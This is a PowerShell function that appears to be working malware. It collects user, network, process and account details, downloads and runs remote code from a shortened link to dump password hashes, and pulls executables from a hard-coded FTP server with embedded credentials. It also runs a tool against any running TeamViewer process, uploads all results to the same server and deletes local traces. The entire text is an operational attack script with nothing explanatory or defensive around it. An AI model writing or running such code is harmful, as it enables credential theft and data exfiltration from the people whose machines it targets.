function cmda{
Param
(
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $i = ""
)
$p = ($env:ComSpec).replace("cmd.exe","")
$n = "xaaa1.txt"
$file = $p + $n
whoami | Out-File  $file
ipconfig /all | Out-File -Append $file
$tmp = tasklist |Out-String
$tmp | Out-File -Append $file
quser  | Out-File -Append $file
net user  | Out-File -Append $file
IEX (New-Object Net.WebClient).DownloadString('https://is.gd/40uATZ');Get-PassHashes | Out-File -Append $file

$ftpPath = 'ftp://186.96.109.22//'
$ftpUser = 'admin'
$ftpPass = 'dHt0Ir5pnmQ68UFY'
$localPath = 'C:\PerfLogs\'
$webclient = New-Object "System.Net.WebClient" 
$webclient.Credentials = New-Object System.Net.NetworkCredential($ftpUser,$ftpPass)  
$webclient.BaseAddress = $ftpPath
$webClient.DownloadFile("e.exe", $localPath+"e.exe")
Start-Sleep -s 3
& C:\PerfLogs\e.exe | Out-File -Append $file
rm C:\PerfLogs\e.exe

if ($tmp -match "TeamViewer.exe")
{
	$parttern="\s\d{1,100}\s"
	(tasklist | Where-Object{$_ -match "TeamViewer.exe"})  -match $parttern
	$id = $matches[0]
	$webClient.DownloadFile("rr.exe", $localPath+"rr.exe")
	Start-Sleep -s 3
	& C:\PerfLogs\rr.exe $id | Out-File -Append $file
	rm C:\PerfLogs\rr.exe
}

$ran=$i
$ftp = 'ftp://186.96.109.22/' +$ran+'.zip'
$infographie=$file
$webclient = New-Object System.Net.WebClient 
$webclient.Credentials = New-Object System.Net.NetworkCredential($ftpUser,$ftpPass)  
$webclient.BaseAddress = $ftpPath
$uri = New-Object System.Uri($ftp)
$webclient.UploadFile($uri, $infographie) 
rm $file
}
